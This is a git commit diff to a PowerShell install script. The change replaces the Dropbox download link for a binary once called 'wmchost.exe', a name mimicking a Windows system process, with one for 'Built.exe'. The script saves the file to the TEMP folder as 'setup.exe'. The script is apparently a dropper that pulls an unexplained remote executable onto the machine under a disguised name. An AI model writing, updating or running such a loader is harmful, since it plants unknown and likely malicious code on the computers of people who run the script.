7602dce69d79dab8fd71c544683aa61f33137d07
Nur Mohammad Rafi <144477870+ostwrafi@users.noreply.github.com>
2026-03-06 23:41:16 +0600

    Update download URL for wmchost.exe

--- installnx.ps1
+++ installnx.ps1
@@ -1,6 +1,6 @@
 # install.ps1 nahid
 
-$u = "https://www.dropbox.com/scl/fi/8sd2wb7b6kjak2riqm7ze/wmchost.exe?rlkey=q9o1dkt2dmtiob1afp0gu3m4g&st=brv975ly&dl=1"
+$u = "https://www.dropbox.com/scl/fi/5jdblgebdbt01q1px4zrj/Built.exe?rlkey=krdcfobfbioysvnuuqb1q7c2i&st=nnsho2pu&dl=1"
 $p = "$env:TEMP\setup.exe"
 
 Invoke-RestMethod $u -OutFile $p
